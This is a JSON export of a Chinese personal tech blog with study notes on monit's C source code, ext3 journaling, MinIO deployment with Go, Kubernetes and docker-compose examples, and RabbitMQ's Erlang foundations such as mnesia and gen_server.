{"meta":{"title":"Saar's Blog","subtitle":"不忘初心 方得始终","description":"","author":"Saar","url":"http://www.yorzorzy.xyz","root":"/"},"pages":[{"title":"","date":"2020-01-16T10:20:53.601Z","updated":"2020-01-16T10:20:53.601Z","comments":true,"path":"monit学习.html","permalink":"http://www.yorzorzy.xyz/monit%E5%AD%A6%E4%B9%A0.html","excerpt":"","text":"monit代码分析主要流程main函数: 12345678910111213141516171819/** * The Prime mover */int main(int argc, char **argv) &#123; Bootstrap(); // Bootstrap libmonit //初始化代码 Bootstrap_setAbortHandler(vLogAbortHandler); // Abort Monit on exceptions thrown by libmonit Bootstrap_setErrorHandler(vLogError); setlocale(LC_ALL, \"C\"); prog = File_basename(argv[0]);#ifdef HAVE_OPENSSL Ssl_start();#endif init_env(); handle_options(argc, argv); do_init(); do_action(argc, argv); do_exit(false); return 0;&#125; Bootstrap函数： 12345Bootstrap:void Bootstrap(void) &#123; Exception_init(); Thread_init();&#125; Ssl_start函数，加载ssl协议 123456789101112131415161718void Ssl_start() &#123;#if (OPENSSL_VERSION_NUMBER &lt; 0x10100000L) || defined(LIBRESSL_VERSION_NUMBER) SSL_library_init(); SSL_load_error_strings(); int locks = CRYPTO_num_locks(); instanceMutexTable = CALLOC(locks, sizeof(Mutex_T)); for (int i = 0; i &lt; locks; i++) Mutex_init(instanceMutexTable[i]); CRYPTO_THREADID_set_callback(_threadID); CRYPTO_set_locking_callback(_mutexLock);#endif if (File_exist(URANDOM_DEVICE)) RAND_load_file(URANDOM_DEVICE, RANDOM_BYTES); else if (File_exist(RANDOM_DEVICE)) RAND_load_file(RANDOM_DEVICE, RANDOM_BYTES); else THROW(AssertException, \"SSL: cannot find %s nor %s on the system\", URANDOM_DEVICE, RANDOM_DEVICE);&#125; 初始化环境： 1234567891011121314151617181920212223242526272829303132333435/** * Initialize the program environment * * @see https://bitbucket.org/tildeslash/monit/commits/cd545838378517f84bdb0989cadf461a19d8ba11 */void init_env() &#123; Util_closeFds(); // Ensure that std descriptors (0, 1 and 2) are open int devnull = open(\"/dev/null\", O_RDWR); if (devnull == -1) &#123; THROW(AssertException, \"Cannot open /dev/null -- %s\", STRERROR); &#125; for (int i = 0; i &lt; 3; i++) &#123; struct stat st; if (fstat(i, &amp;st) == -1) &#123; if (dup2(devnull, i) &lt; 0) &#123; close(devnull); THROW(AssertException, \"dup2 failed -- %s\", STRERROR); &#125; &#125; &#125; close(devnull); // Get password struct with user info char buf[4096]; struct passwd pw, *result = NULL; if (getpwuid_r(geteuid(), &amp;pw, buf, sizeof(buf), &amp;result) != 0 || ! result) THROW(AssertException, \"getpwuid_r failed -- %s\", STRERROR); Run.Env.home = Str_dup(pw.pw_dir); Run.Env.user = Str_dup(pw.pw_name); // Get CWD char t[PATH_MAX]; if (! Dir_cwd(t, PATH_MAX)) THROW(AssertException, \"Monit: Cannot read current directory -- %s\", STRERROR); Run.Env.cwd = Str_dup(t);&#125; handle_options函数处理传参情况： do_init函数初始化文件和服务 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109/** * Initialize this application - Register signal handlers, * Parse the control file and initialize the program's * datastructures and the log system. */static void do_init() &#123; /* * Register interest for the SIGTERM signal, * in case we run in daemon mode this signal * will terminate a running daemon. */ signal(SIGTERM, do_destroy); /* * Register interest for the SIGUSER1 signal, * in case we run in daemon mode this signal * will wakeup a sleeping daemon. */ signal(SIGUSR1, do_wakeup); /* * Register interest for the SIGINT signal, * in case we run as a server but not as a daemon * we need to catch this signal if the user pressed * CTRL^C in the terminal */ signal(SIGINT, do_destroy); /* * Register interest for the SIGHUP signal, * in case we run in daemon mode this signal * will reload the configuration. */ signal(SIGHUP, do_reload); /* * Register no interest for the SIGPIPE signal, */ signal(SIGPIPE, SIG_IGN); /* * Initialize the random number generator */ srandom((unsigned)(Time_now() + getpid())); /* * Initialize the Runtime mutex. This mutex * is used to synchronize handling of global * service data */ Mutex_init(Run.mutex); /* * Initialize heartbeat mutex and condition */ Mutex_init(heartbeatMutex); Sem_init(heartbeatCond); /* * Get the position of the control file */ if (! Run.files.control) Run.files.control = file_findControlFile(); /* * Initialize the system information data collecting interface */ if (init_system_info()) Run.flags |= Run_ProcessEngineEnabled; /* * Start the Parser and create the service list. This will also set * any Runtime constants defined in the controlfile. */ if (! parse(Run.files.control)) exit(1); /* * Initialize the log system */ if (! log_init()) exit(1); /* * Did we find any service ? */ if (! servicelist) &#123; LogError(\"No service has been specified\\n\"); exit(0); &#125; /* * Initialize Runtime file variables */ file_init(); /* * Should we print debug information ? */ if (Run.debug) &#123; Util_printRunList(); Util_printServiceList(); &#125; /* * Reap any stray child processes we may have created */ atexit(waitforchildren);&#125; file_findControlFile()函数，读取配置文件，corefoundation 12345678910111213141516171819202122232425char *file_findControlFile() &#123; char *rcfile = CALLOC(sizeof(char), STRLEN + 1); snprintf(rcfile, STRLEN, \"%s/.%s\", Run.Env.home, MONITRC); if (File_exist(rcfile)) &#123; return rcfile; &#125; snprintf(rcfile, STRLEN, \"/etc/%s\", MONITRC); if (File_exist(rcfile)) &#123; return rcfile; &#125; snprintf(rcfile, STRLEN, \"%s/%s\", SYSCONFDIR, MONITRC); if (File_exist(rcfile)) &#123; return rcfile; &#125; snprintf(rcfile, STRLEN, \"/usr/local/etc/%s\", MONITRC); if (File_exist(rcfile)) &#123; return rcfile; &#125; if (File_exist(MONITRC)) &#123; snprintf(rcfile, STRLEN, \"%s/%s\", Run.Env.cwd, MONITRC); return rcfile; &#125; LogError(\"Cannot find the Monit control file at ~/.%s, /etc/%s, %s/%s, /usr/local/etc/%s or at ./%s \\n\", MONITRC, MONITRC, SYSCONFDIR, MONITRC, MONITRC, MONITRC); exit(1);&#125; do_action主流程: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485/** * Dispatch to the submitted action - actions are program arguments */static void do_action(int argc, char **args) &#123; char *action = args[optind]; Run.flags |= Run_Once; if (! action) &#123; do_default(); &#125; else if (IS(action, \"start\") || IS(action, \"stop\") || IS(action, \"monitor\") || IS(action, \"unmonitor\") || IS(action, \"restart\")) &#123; char *service = args[++optind]; if (Run.mygroup || service) &#123; int errors = 0; List_T services = List_new(); if (Run.mygroup) &#123; for (ServiceGroup_T sg = servicegrouplist; sg; sg = sg-&gt;next) &#123; if (IS(Run.mygroup, sg-&gt;name)) &#123; for (list_t m = sg-&gt;members-&gt;head; m; m = m-&gt;next) &#123; Service_T s = m-&gt;e; List_append(services, s-&gt;name); &#125; break; &#125; &#125; if (List_length(services) == 0) &#123; List_free(&amp;services); LogError(\"Group '%s' not found\\n\", Run.mygroup); exit(1); &#125; &#125; else if (IS(service, \"all\")) &#123; for (Service_T s = servicelist; s; s = s-&gt;next) List_append(services, s-&gt;name); &#125; else &#123; List_append(services, service); &#125; errors = exist_daemon() ? (HttpClient_action(action, services) ? 0 : 1) : control_service_string(services, action); List_free(&amp;services); if (errors) exit(1); &#125; else &#123; LogError(\"Please specify a service name or 'all' after %s\\n\", action); exit(1); &#125; &#125; else if (IS(action, \"reload\")) &#123; LogInfo(\"Reinitializing %s daemon\\n\", prog); kill_daemon(SIGHUP); &#125; else if (IS(action, \"status\")) &#123; char *service = args[++optind]; if (! HttpClient_status(Run.mygroup, service)) exit(1); &#125; else if (IS(action, \"summary\")) &#123; char *service = args[++optind]; if (! HttpClient_summary(Run.mygroup, service)) exit(1); &#125; else if (IS(action, \"report\")) &#123; char *type = args[++optind]; if (! HttpClient_report(type)) exit(1); &#125; else if (IS(action, \"procmatch\")) &#123; char *pattern = args[++optind]; if (! pattern) &#123; printf(\"Invalid syntax - usage: procmatch \\\"&lt;pattern&gt;\\\"\\n\"); exit(1); &#125; ProcessTree_testMatch(pattern); &#125; else if (IS(action, \"quit\")) &#123; kill_daemon(SIGTERM); &#125; else if (IS(action, \"validate\")) &#123; if (do_wakeupcall()) &#123; char *service = args[++optind]; HttpClient_status(Run.mygroup, service); &#125; else &#123; _validateOnce(); &#125; exit(1); &#125; else &#123; LogError(\"Invalid argument -- %s (-h will show valid arguments)\\n\", action); exit(1); &#125;&#125; action= start stop monitor unmonitor restart 通过维护一个服务列表发送post请求给服务端来启动服务。 do_default主要启动服务的函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384/** * Default action - become a daemon if defined in the Run object and * run validate() between sleeps. If not, just run validate() once. * Also, if specified, start the monit http server if in deamon mode. */static void do_default() &#123; if (Run.flags &amp; Run_Daemon) &#123; if (do_wakeupcall()) exit(0); Run.flags &amp;= ~Run_Once; if (can_http()) &#123; if (Run.httpd.flags &amp; Httpd_Net) LogInfo(\"Starting Monit %s daemon with http interface at [%s]:%d\\n\", VERSION, Run.httpd.socket.net.address ? Run.httpd.socket.net.address : \"*\", Run.httpd.socket.net.port); else if (Run.httpd.flags &amp; Httpd_Unix) LogInfo(\"Starting Monit %s daemon with http interface at %s\\n\", VERSION, Run.httpd.socket.unix.path); &#125; else &#123; LogInfo(\"Starting Monit %s daemon\\n\", VERSION); &#125; if (! (Run.flags &amp; Run_Foreground)) daemonize(); if (! file_createPidFile(Run.files.pid)) &#123; LogError(\"Monit daemon died\\n\"); exit(1); &#125; if (! State_open()) exit(1); State_restore(); atexit(file_finalize); if (Run.startdelay &amp;&amp; State_reboot()) &#123; time_t now = Time_now(); time_t delay = now + Run.startdelay; LogInfo(\"Monit will delay for %ds on first start after reboot ...\\n\", Run.startdelay); /* sleep can be interrupted by signal =&gt; make sure we paused long enough */ while (now &lt; delay) &#123; sleep((unsigned int)(delay - now)); if (Run.flags &amp; Run_Stopped) do_exit(false); now = Time_now(); &#125; &#125; if (can_http()) monit_http(Httpd_Start); /* send the monit startup notification */ Event_post(Run.system, Event_Instance, State_Changed, Run.system-&gt;action_MONIT_START, \"Monit %s started\", VERSION); if (Run.mmonits) &#123; Thread_create(heartbeatThread, heartbeat, NULL); heartbeatRunning = true; &#125; while (true) &#123; validate(); /* In the case that there is no pending action then sleep */ if (! (Run.flags &amp; Run_ActionPending) &amp;&amp; ! interrupt()) sleep(Run.polltime); if (Run.flags &amp; Run_DoWakeup) &#123; Run.flags &amp;= ~Run_DoWakeup; LogInfo(\"Awakened by User defined signal 1\\n\"); &#125; if (Run.flags &amp; Run_Stopped) &#123; do_exit(true); &#125; else if (Run.flags &amp; Run_DoReload) &#123; do_reinit(); &#125; else &#123; State_saveIfDirty(); &#125; &#125; &#125; else &#123; _validateOnce(); &#125;&#125; do_wakeupcall调用函数是否需要唤醒进程。 can_http()判断是否可以启动http. daemonize()函数： 12345678910111213141516171819202122232425262728293031323334/** * Transform a program into a daemon. Inspired by code from Stephen * A. Rago's book, Unix System V Network Programming. */void daemonize() &#123; pid_t pid; /* * Become a session leader to lose our controlling terminal */ if ((pid = fork ()) &lt; 0) &#123; LogError(\"Cannot fork a new process\\n\"); exit (1); &#125; else if (pid != 0) &#123; _exit(0); &#125; setsid(); if ((pid = fork ()) &lt; 0) &#123; LogError(\"Cannot fork a new process\\n\"); exit (1); &#125; else if (pid != 0) &#123; _exit(0); &#125; /* * Change current directory to the root so that other file systems can be unmounted while we're running */ if (chdir(\"/\") &lt; 0) &#123; LogError(\"Cannot chdir to / -- %s\\n\", STRERROR); exit(1); &#125; /* * Attach standard descriptors to /dev/null. Other descriptors should be closed in env.c */ Util_redirectStdFds();&#125; file_createPidFile场景pid文件。 服务数据结构，所有的服务数据结构都在monit.h文件中 yacc flex解析 使用flex词法解析器，yacc语法解析器。"},{"title":"categories","date":"2020-01-17T08:18:23.000Z","updated":"2020-01-17T08:18:23.968Z","comments":true,"path":"categories/index.html","permalink":"http://www.yorzorzy.xyz/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-01-17T08:25:11.000Z","updated":"2020-01-17T08:25:11.473Z","comments":true,"path":"tags/index.html","permalink":"http://www.yorzorzy.xyz/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"journal block device","slug":"journal block device","date":"2021-04-27T07:11:41.150Z","updated":"2021-04-27T07:09:16.000Z","comments":true,"path":"2021/04/27/journal block device/","link":"","permalink":"http://www.yorzorzy.xyz/2021/04/27/journal%20block%20device/","excerpt":"","text":"journal block device介绍jbd是如何解决问题 提到一致性，大家会想到数据库里面的事务的概念，事务有四个基本属性 原子性事务必须是原子工作单元；对于其数据修改，要么全部执行，要么全都不执行。 一致性事务在完成时，必须使所有的数据都保持一致状态。 隔离性由并发事务所做的修改必须与任何其他并发事务所做的修改隔离。事务识别数据时数据所处的状态，要么是另一并发事务修改它之前的状态，要么是第二个事务修改它之后的状态，事务不会识别中间状态的数据。 持久性事务完成之后，他对于系统的影响是永久性的。该修改即使出现系统故障也将一直保持。 文件系统的开发者借用了数据库中事务的思想，将其应用于文件系统上，以期保证对文件系统操作的原子性、隔离性，尽量使文件系统处于一致性。 在磁盘上单独划分一个日志空间 日志，在这里指的是磁盘上存储事务数据的那个地方，即若干磁盘块。它可以以一个单独的文件形式存在，也可以由文件系统预留一个inode和一些磁盘块，也可以是单独的磁盘分区。总之就是磁盘上存储事务数据的那个地方。 提到日志时，可能还有另外一种含义，就是它是一种机制，用于管理内存中的缓存区、事务、磁盘日志数据读写等等所有这一切，统称为日志。读者注意根据上下文进行区分。 将内存事务的数据写到日志中 文件系统可以选择定期（每隔5秒，或用户指定的时间间隔）或者立即将内存中的事务数据写到磁盘日志上，以备发生系统崩溃后可以利用日志中的数据恢复，重新使文件系统保持一致的状态。 这个间隔时间的选取，要注意性能的平衡。时间间隔越短，文件系统丢失数据的可能性就越少，一致性的时间点就越新，但是IO负担就越重，很可能就会影响系统的性能。反过来，时间间隔越大，文件系统丢失的数据可能就越多，一致性的时间点就越旧。但是IO负担就比较轻，不太会影响系统的性能。 文件系统某些操作抽象成原子操作 所谓原子操作，就是内部不再分割的操作，该操作要么完全完成，要么根本没有执行，不存在部分完成的状态。 那么，什么样的操作可以看成对文件系统的原子操作呢？往一个磁盘文件中追加写入1MB字节可以看成一个原子操作么？这个操作其实比较大，因为要写1MB的数据，要为文件分配1024个磁盘块，同时还要分配若干个索引块，也会涉及到很多的磁盘块位图、块组块的读写，非常复杂，时间也会比较长，中间出问题的机会就比较多，所以不适宜看做一个原子操作。 那么，什么样的操作可以看成对文件系统的原子操作呢？比如说为文件分配一个磁盘块，就看成一个原子操作就比较合适。分配一个磁盘块，可能需要修改一个inode块、一个磁盘块位图、最多三个间接索引块、块组块、超级块，一共最多7个磁盘块。将分配一个磁盘块看成一个原子操作，意味着上述修改7个磁盘块的操作要么都成功，要么都失败，不可能有第三种状态。 若干个原子操作组成一个事务 实现日志文件系统时，可以将一个原子操作就作为一个事务来处理，但是这样实现的效率比较低。于是ext3将若干个原子操作组合成一个事务，对磁盘日志以事务为单位进行管理，以提高读写日志的效率。 从日志恢复数据 jbd的思想就是原来内核读写磁盘的逻辑保持不变，但是对于影响文件系统一致性的数据块（即元数据块，第四章会详细解释），及时地写到磁盘上的日志空间中去。这样，即使系统崩溃了，也能从日志中恢复数据，确保文件系统的一致性。如错误！未找到引用源。，其中绿色的箭头表示正常的磁盘读写，紫色的箭头表示由jbd将元数据块额外写一份到磁盘日志中，红色箭头表示恢复时，由jbd将日志中的数据写回磁盘的原始位置。 补习linux 文件系统知识 参考资料https://blog.csdn.net/qq_22613757/article/details/86571646","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://www.yorzorzy.xyz/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://www.yorzorzy.xyz/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"minio存储","slug":"miniIO","date":"2021-04-27T07:07:37.336Z","updated":"2021-04-27T07:07:37.336Z","comments":true,"path":"2021/04/27/miniIO/","link":"","permalink":"http://www.yorzorzy.xyz/2021/04/27/miniIO/","excerpt":"","text":"minio存储部署安装源码安装 1git clone http://github.com/minio/minio goland打开 1go run main.go 启动1go run main.go server data1 data2 data3 data4 data5 data6 data7 data8 浏览器访问 1http://127.0.0.1:9000 SDKgolang client： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657package mainimport ( \"context\" \"github.com/minio/minio-go/v7\" \"github.com/minio/minio-go/v7/pkg/credentials\" \"log\")func main() &#123; ctx := context.Background() endpoint := \"10.51.30.214:9000\" accessKeyID := \"minioadmin\" secretAccessKey := \"minioadmin\" useSSL := false // Initialize minio client object. minioClient, err := minio.New(endpoint, &amp;minio.Options&#123; Creds: credentials.NewStaticV4(accessKeyID, secretAccessKey, \"\"), Secure: useSSL, &#125;) if err != nil &#123; log.Fatalln(err) &#125; log.Printf(\"%#v\\n\", minioClient) // minioClient is now set up // Make a new bucket called mymusic. bucketName := \"mymusic\" location := \"us-east-1\" err = minioClient.MakeBucket(ctx, bucketName, minio.MakeBucketOptions&#123;Region: location&#125;) if err != nil &#123; // Check to see if we already own this bucket (which happens if you run this twice) exists, errBucketExists := minioClient.BucketExists(ctx, bucketName) if errBucketExists == nil &amp;&amp; exists &#123; log.Printf(\"We already own %s\\n\", bucketName) &#125; else &#123; log.Fatalln(err) &#125; &#125; else &#123; log.Printf(\"Successfully created %s\\n\", bucketName) &#125; // Upload the zip file objectName := \"aaa.zip\" filePath := \"aaa.zip\" contentType := \"application/zip\" // Upload the zip file with FPutObject n, err := minioClient.FPutObject(ctx, bucketName, objectName, filePath, minio.PutObjectOptions&#123;ContentType: contentType&#125;) if err != nil &#123; log.Fatalln(err) &#125; log.Printf(\"Successfully uploaded %s of size %d\\n\", objectName, n)&#125; 对接k8s安装 123kubectl krew updatekubectl krew install miniokubectl minio init 创建新租户 配置至少16个pv 123456kubectl minio tenant create minio-tenant-1 \\ --servers 4 \\ --volumes 16 \\ --capacity 16Ti \\ --namespace minio-tenant-1 \\ --storageClassName local-storage \\ 设置默认的存储StorageClass 123456apiVersion: storage.k8s.io/v1kind: StorageClassmetadata: name: local-storageprovisioner: kubernetes.io/no-provisionervolumeBindingMode: WaitForFirstConsumer docker-compose部署minio: docker-compose 文件如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697version: '3.7'# starts 4 docker containers running minio server instances.# using nginx reverse proxy, load balancing, you can access# it through port 9000.services: minio1: image: minio/minio:RELEASE.2021-01-05T05-22-38Z volumes: - data1-1:/data1 - data1-2:/data2 expose: - \"9000\" environment: MINIO_ROOT_USER: minio MINIO_ROOT_PASSWORD: minio123 command: server http://minio&#123;1...4&#125;/data&#123;1...2&#125; healthcheck: test: [\"CMD\", \"curl\", \"-f\", \"http://localhost:9000/minio/health/live\"] interval: 30s timeout: 20s retries: 3 minio2: image: minio/minio:RELEASE.2021-01-05T05-22-38Z volumes: - data2-1:/data1 - data2-2:/data2 expose: - \"9000\" environment: MINIO_ROOT_USER: minio MINIO_ROOT_PASSWORD: minio123 command: server http://minio&#123;1...4&#125;/data&#123;1...2&#125; healthcheck: test: [\"CMD\", \"curl\", \"-f\", \"http://localhost:9000/minio/health/live\"] interval: 30s timeout: 20s retries: 3 minio3: image: minio/minio:RELEASE.2021-01-05T05-22-38Z volumes: - data3-1:/data1 - data3-2:/data2 expose: - \"9000\" environment: MINIO_ROOT_USER: minio MINIO_ROOT_PASSWORD: minio123 command: server http://minio&#123;1...4&#125;/data&#123;1...2&#125; healthcheck: test: [\"CMD\", \"curl\", \"-f\", \"http://localhost:9000/minio/health/live\"] interval: 30s timeout: 20s retries: 3 minio4: image: minio/minio:RELEASE.2021-01-05T05-22-38Z volumes: - data4-1:/data1 - data4-2:/data2 expose: - \"9000\" environment: MINIO_ROOT_USER: minio MINIO_ROOT_PASSWORD: minio123 command: server http://minio&#123;1...4&#125;/data&#123;1...2&#125; healthcheck: test: [\"CMD\", \"curl\", \"-f\", \"http://localhost:9000/minio/health/live\"] interval: 30s timeout: 20s retries: 3 nginx: image: nginx:1.19.2-alpine volumes: - ./nginx.conf:/etc/nginx/nginx.conf:ro ports: - \"9000:9000\" depends_on: - minio1 - minio2 - minio3 - minio4## By default this config uses default local driver,## For custom volumes replace with volume driver configuration.volumes: data1-1: data1-2: data2-1: data2-2: data3-1: data3-2: data4-1: data4-2: 执行启动minio 12docker-compose pulldocker-compose up -d 原理特点： 高性能：作为高性能对象存储，在标准硬件条件下它能达到55GB/s的读、35GG/s的写速率 可扩容：不同MinIO集群可以组成联邦，并形成一个全局的命名空间，并跨越多个数据中心 云原生：容器化、基于K8S的编排、多租户支持 Amazon S3兼容：Minio使用Amazon S3 v2 / v4 API。可以使用Minio SDK，Minio Client，AWS SDK和AWS CLI访问Minio服务器。 可对接后端存储: 除了Minio自己的文件系统，还支持DAS、 JBODs、NAS、Google云存储和Azure Blob存储。 SDK支持: 基于Minio轻量的特点，它得到类似Java、Python或Go等语言的sdk支持 Lambda计算: Minio服务器通过其兼容AWS SNS / SQS的事件通知服务触发Lambda功能。支持的目标是消息队列，如Kafka，NATS，AMQP，MQTT，Webhooks以及Elasticsearch，Redis，Postgres和MySQL等数据库。 有操作页面 功能简单: 这一设计原则让MinIO不容易出错、更快启动 支持纠删码：MinIO使用纠删码、Checksum来防止硬件错误和静默数据污染。在最高冗余度配置下，即使丢失1/2的磁盘也能恢复数据 Erasure Code 副本（Replication）策略： 副本，实打实的复制，常见的是三副本，意味着现实世界有三份一样的数据。代价稍高，偏计算类的场景基本都会用该策略，比如虚拟机VM、数据库。如果一个副本挂了，马上切到另外一个，漂移时间非常短。n副本存储效率永远是1/n。 纠删码（Erasure Code）策略： 纠删码，会把数据进行切分，同时计算校验块。以常见的reedsolomon（RS）纠删码为例，在6数据块+3校验块的情景，可以允许3个块（任意数据块+校验块数量之和为3）损坏。在偏纯存储的场景会用到，例如对象存储。n数据块+m校验块的纠删码配置，存储效率是n/n+m， 但是在重构（Reconstruct）的时候，需要消耗cpu资源，而且有一定延时。 minio是一个对象存储服务，存储考虑的是低成本+高可用，其纠删码使用的是RS纠删码，对应的github仓库是github.com/klauspost/reedsolomon单核恢复能力超过1GB/s, 特定平台可以通过指令加速。 Minio采用Reed-Solomon code将对象拆分成N/2数据和N/2 奇偶校验块。 这就意味着如果是12块盘，一个对象会被分成6个数据块、6个奇偶校验块，你可以丢失任意6块盘（不管其是存放的数据块还是奇偶校验块），你仍可以从剩下的盘中的数据进行恢复。 位衰减又被称为数据腐化Data Rot、无声数据损坏Silent Data Corruption,是目前硬盘数据的一种严重数据丢失问题。硬盘上的数据可能会神不知鬼不觉就损坏了，也没有什么错误日志。正所谓明枪易躲，暗箭难防，这种背地里犯的错比硬盘直接咔咔宕了还危险。 不过不用怕，Minio纠删码采用了高速BLAKE2 基于哈希的校验和来防范位衰减。 BLAKE2 BLAKE算法于2008年提出，它包含两个版本，一种基于32位word用于产生最长256位的哈希结果，一种基于64位word用于产生最长512位的哈希结果，BLAKE算法核心操作是不断地将8个散列中间结果和16个输入word进行组合，从而产生下一轮组合的8个中间结果。按照最终截断的哈希长度，BLAKE-256和BLAKE-224使用32位字分别产生256位和224位的哈希结果（也称消息摘要），而BLAKE-512和BLAKE-384使用64位字并产生512位和384位哈希结果。 BLAKE2算法基于BLAKE算法，于2012年被提出，BLAKE2不再向blake round函数中对输入字添加常量，修改了两个旋转常量及padding等，并在BLAKE2b（对应BLAKE-512）中将rounds的数量由16减少为12，在BLAKE2s（对应BLAKE-256）中将rounds数量由14减少为10，同样的，BLAKE2b产生1到64字节的消息摘要，BLAKE2s产生1到32字节的消息摘要，同时这两种算法也由对应的多核并行版本BLAKE2bp（4路并行）和BLAKE2sp（8路并行）。除了以上几种算法变种，BLAKE2还有一种BLAKE2x的变种，这种算法可以产生任意长度的消息摘要，详情请参考相应文档。除了安全性方面的优势，据称BLAKE2算法在Intel CPU第六代微处理架构（Skylake）中的处理速度要优于MD5，SHA-1，SHA-2和SHA-3等算法 BLAKE系列算法被广泛应用于区块链数字货币领域，下面介绍3中典型数字货币： 1 decred以blake256为核心哈希算法，其主页为：https://decred.org/ 2 sia以blake2b为核心哈希算法，其主页为：https://sia.tech/ 3 verge以blake2s为核心哈希算法，其主页为：https://vergecurrency.com/ 至于具体哈希算法在各个币种应用细节，请参考相关钱包的源代码。 总结继续学习 参考资料https://www.jianshu.com/p/c2b43ff67df0","categories":[{"name":"存储","slug":"存储","permalink":"http://www.yorzorzy.xyz/categories/%E5%AD%98%E5%82%A8/"}],"tags":[{"name":"存储","slug":"存储","permalink":"http://www.yorzorzy.xyz/tags/%E5%AD%98%E5%82%A8/"}]},{"title":"rabbitmq源码学习二","slug":"rabbitmq源码分析2","date":"2021-01-28T01:49:38.907Z","updated":"2021-01-28T01:49:38.907Z","comments":true,"path":"2021/01/28/rabbitmq源码分析2/","link":"","permalink":"http://www.yorzorzy.xyz/2021/01/28/rabbitmq%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%902/","excerpt":"","text":"rabbitmq 源码分析二概念OTP代表Open Telecom Platform，开放电信平台。 erlang的存储ets和dets是两个erlang中的系统模块，用于存储海量的erlang数据。ETS是Erlang Term Storage的缩写，DETS则是Disk ETS的缩写。 ETS和DETS提供健和值的查询表。ETS常驻内存，DETS则常驻磁盘。 ETS表内部使用散列表标识，也就是平衡二叉树。 ETS不会进行垃圾收集，也就是表中存储了海量的数据也不会产生垃圾收集的开销。 DETS的最大的文件大小是2G。 rabbitmq中的mnesiamnesia是用erlang编写的数据库，用于高要求的电信应用程序，支持事务。 mnesia是基于Erlang的分布式数据库管理系统，是Erlang OTP的重要组件。 mnesia数据库被组织为一个表的集合，每个表由记录(通常被定义为Erlang Record)构成，表本身也包含一些属性，如类型，位置和持久性。这种表集合和记录的概念，和ets表很类似。事实上，mnesia中的数据在节点内就是以ets表存储的。因此，mnesia实际上是一个分布式的ets。 mnesia中的表在节点内有三种存储形式： ram_copies: 表仅存储于内存，可通过mnesia:dump_tables(TabList)来将数据导入到硬盘。 disc_copies: 表存储于内存中，但同时拥有磁盘备份，对表的写操作会分为两步：1.将写操作写入日志文件 2. 对内存中的表执行写操作 disc_only_copies: 表仅存储于磁盘中，对表的读写将会更慢，但是不会占用内存 表的存储形式可以在表的创建中指出，默认为ram_copies。也可以在创建表后通过mnesia:change_table_copy_type/3来修改。 表的属性由mnesia:create_table(Name, TableDef)中的TableDef指定，TableDef是一个Tuple List，其中比较重要的属性有： type: 表的类型，主要有set, ordered_set和bag三种。前两者要求key唯一，bag不要求key唯一，但要求至少有一个字段不同。另外set和bag通过哈希表实现，而ordered_set则使用其它数据结构(如红黑树)以对key排序。type属性默认为set。 attributes: 表中条目的字段，通常由record_info(fields, myrecord)得出，而myrecord一般则用作表名。 local_content: 标识该表是否为本地表，local_content属性为true的表将仅本地可见，不会共享到集群中。local_content默认为false。 index: 表的索引。 ram_copies: 指名该表在哪些节点上存储为ram_copies。默认值为[node()]。即新建表默认都存储为ram_copies。 disc_copies: 该表在哪些节点上存储为disc_copies。默认为[]。 disc_only_copies: 该表在哪些节点上存储为disc_only_copies。默认为[]。 schema表是mnesia数据库一张特殊的表，又叫模式表。它记录数据库中其它表的信息，schema表只能有ram_copies或disc_copies两种存储形式。并且一旦schema表存储为ram_copies，那么该节点上的其它表，也将只能存储为ram_copies。 mnesia需要schema表的初始化自身，可在mnesia启动前，通过mnesia:create_schema/1来创建一个disc_copies类型的schema表，如果不调用mnesia:create_schema/1，直接启动mnesia:start/0，默认生成一个ram_copies类型的schema表，此时我们称该mnesia节点为”无盘节点”，因为其所有表都不能存储于磁盘中。 mnesia表由记录组成，记录第一个元素为是记录名，第二个元素为标识记录的键。{表名，键}可以唯一标识表中特定记录，又称为记录的对象标识(Oid)。 mnesia要求表中所有的记录必须为同一个record的实例，前面的例子中，表名即为记录名，表字段则为记录的域。而实际上，记录名可以是但不一定是表名，记录名可通过record_name属性指出，没有指定table_name则记录名默认为create_table第一参数指定的表名。 123mnesia:dirty_write(Record) -&gt; Tab &#x3D; element(1, Record), mnesia:dirty_write(Tab, Record). % 这里提取出表名，表名和表中记录原型实际上是分离的 表名和记录名不一致使我们可以定义多个以同一record的原型的table。 mneisa的优势: 与Erlang的完美契合，记录字段可以是任意Erlang Term，具备强大的描述能力 和传统数据库一样，支持事务，索引，分片等特性 分布式特性，表的存储类型和位置对应用透明，支持分布式事务 强大的动态配置能力，包括集群的动态伸缩，表的动态配置，增删，转移，升级等 mnesia缺点： 多节点事务带来的开销，尽可能少使用事务(在逻辑上配合做处理) mnesia全联通网络的维护开销，在使用时需要控制集群节点数量 不适合存储大量数据，这会带来网络负载 gen_servergen_server代表的就是“行为模式”的一种，行为模式的目的在于为特定类型的进程提供一套模板。 用来启动服务器的有start/3,start/4,start_link/3,start_link/4这四个函数。 使用这些start函数之后，就会产生一个新的进程，也就是一个gen_server服务器。这些 start函数的正常情况下返回值是{ok,Pid}，Pid就是这个新进程的进程号。 带link与不带的区别在于是否跟父进程建立链接，换种说法是，新启动的进程死掉后，会不会通知启动他的进程（父进程）。 start函数可以四个参数(ServerName, Module, Args, Options)： 第一个参数ServerName是服务名， 是可以省掉的。具有相同服务名的模块在一个节点中只能启动一次，重复启动会报错，为 {error, {already_started, Pid}}。具有服务名的服务进程可以使用服务名来调用， 没有服务名的只能通过进程号pid来调用了。通常有名字的服务进程会使用模块名做为 服务名，即上面模板中定义的宏-define(SERVER, ?MODULE)，然后在需要使用服务名的 地方填入?SERVER. 第二个参数Module是模块名，一般而言API和回调函数是写在同一个文件里的，所以就用 ?MODULE，表示本模块的模块名。 第三个参数Args是回调函数init/1的参数，会原封不动地传给init/1。 